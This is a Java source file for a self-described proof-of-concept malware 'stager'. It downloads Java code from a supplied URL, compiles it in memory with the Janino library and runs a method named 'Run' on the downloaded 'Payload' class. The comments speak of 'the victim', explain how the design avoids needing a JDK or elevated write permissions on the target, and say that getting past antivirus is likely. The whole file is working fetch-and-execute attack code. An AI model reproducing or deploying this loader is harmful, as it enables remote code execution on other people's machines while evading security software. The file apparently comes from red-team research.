
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import org.codehaus.janino.*;

/*
 * Copyright 2018 cornerpirate.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * A proof of concept stager. This downloads a payload from a URL Compiles it in
 * memory and then executes a method in that payload. I was inspired by this
 * talk by James Williams:
 *
 * https://www.youtube.com/watch?v=247m2dwLlO4
 *
 * Who said try it in Java.
 * 
 * Based on this PDF:
 * 
 * http://fivedots.coe.psu.ac.th/~ad/jg/javaArt1/onTheFlyArt1.pdf
 * 
 * I found the best solution would be to use "Janino". This gets
 * around these requirements:
 * 
 * 1) That the victim must have JDK installed (unlikely for most users)
 * 2) That the victim has permissions to write to "JRE/lib" folder 
 * 
 * The solution to 1) was to copy a version of JDK's "tools.jar" to JRE/lib.
 * This introduced licensing issues as well as privileges for 2).
 * 
 * Instead using Janino means we can integrate "janino.jar" into the lib folder
 * and have a functional Java compiler. Janino lives here:
 * 
 * http://janino-compiler.github.io/janino/
 *
 * Bypassing AntiVirus is likely but I just wanted to replicate some of the
 * interesting steps in Java.
 *
 * @author cornerpirate
 */
public class Stager {
   
    public static void main(String args[]) {
        
        // Check how many arguments were passed in
        if (args.length != 1) {
            System.out.println("Proper Usage is: java Stager <url>");
            System.exit(0);
        }

        // if we get here then a parameter was provided.
        String u = args[0];
        System.out.println("[*] URL provided: " + u);

        try {

            // URL for java code
            URL payloadServer = new URL(u);

            URLConnection yc = payloadServer.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    yc.getInputStream()));

            // Download code into memory
            String inputLine;
            StringBuffer payloadCode = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                payloadCode.append(inputLine + "\n");
            }
            System.out.println("[*] Downloaded payload");
            
            // Compile it using Janino
            System.out.println("[*] Compiling ....");
            SimpleCompiler compiler = new SimpleCompiler();
            compiler.cook(new StringReader(payloadCode.toString()));
            Class<?> compiled = compiler.getClassLoader().loadClass("Payload") ;

            // Execute "Run" method using reflection
            System.out.println("[*] Executing ....");
            Method runMeth = compiled.getMethod("Run");
            // This form of invoke works when "Run" is static
            runMeth.invoke(null); 
            
            System.out.println("[*] Payload, payloading ....");

            in.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }

    }

}
